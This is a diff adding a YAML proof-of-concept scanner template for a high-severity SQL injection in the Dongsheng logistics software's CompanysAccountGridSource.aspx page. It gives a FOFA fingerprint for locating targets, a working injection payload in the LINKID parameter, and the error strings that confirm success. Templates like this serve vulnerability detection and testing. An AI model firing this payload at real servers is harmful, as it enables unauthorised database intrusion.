@@ -1,0 +1,17 @@
+id: poc-yaml-dongshengsoft-companysaccountgridsource-sqli
+info:
+  name: 东胜物流软件 CompanysAccountGridSource SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+variables:
+  t1: random_int(1,100000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Shipping/CompanysAccountGridSource.aspx?LINKID=-1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))%20--&read=exist
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,t2)
+transport: http
